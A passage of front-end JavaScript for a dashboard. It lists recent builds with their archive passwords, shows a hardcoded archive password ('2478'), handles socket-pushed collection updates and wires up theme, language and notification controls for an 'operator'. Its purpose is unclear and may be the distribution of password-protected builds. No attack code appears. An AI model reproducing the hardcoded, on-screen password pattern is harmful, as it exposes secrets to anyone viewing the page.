    finalSec.appendChild(el('div', { style: 'margin-top:1rem;color:var(--text-mute);font-size:0.75rem' }, [t('archivePassword') + ': 2478']));
    finalSec.appendChild(el('div', { style: 'margin-top:0.5rem;font-size:0.85rem;font-weight:600' }, [t('recentBuilds')]));
    b.builds.forEach(bd => {
      finalSec.appendChild(el('div', { style: 'padding:0.6rem 0;border-bottom:1px solid var(--border-soft);display:flex;justify-content:space-between;align-items:center' }, [
        el('div', {}, [
          el('div', { style: 'font-size:0.82rem' }, [bd.name]),
          el('div', { style: 'font-size:0.7rem;color:var(--text-mute)' }, [bd.createdAt + ' · ' + bd.size + ' · ' + bd.password])
        ])
      ]));
    });
    root.appendChild(finalSec);
  }
};

socket.on('push', ({ collection: col, item }) => {
  if (caches[col]) {
    caches[col].push(item);
    if (collectionRerender[col]) collectionRerender[col]();
  }
});

/* ===== Wiring ===== */
$('modalClose').onclick = closeModal;
$('modal').onclick = (e) => { if (e.target === $('modal')) closeModal(); };
document.addEventListener('click', hideCtx);
$('notifBtn').onclick = (e) => { e.stopPropagation(); toggleNotifPanel(); };
$('notifClose').onclick = () => $('notifPanel').classList.add('hidden');
$('notifClear').onclick = () => { notifications.length = 0; renderNotifications(); };
$('themeBtn').onclick = (e) => { e.stopPropagation(); toggleThemePanel(); };
$('themeClose').onclick = () => $('themePanel').classList.add('hidden');
$('profileBtn').onclick = () => toast('operator');
document.querySelectorAll('#loginLangs button, #themeLangs button').forEach(b => {
  b.onclick = () => applyLang(b.dataset.lang);
});

/* ===== Boot ===== */
document.body.setAttribute('data-theme', currentTheme);
renderThemePanel();
applyLang(currentLang);
renderNotifications();
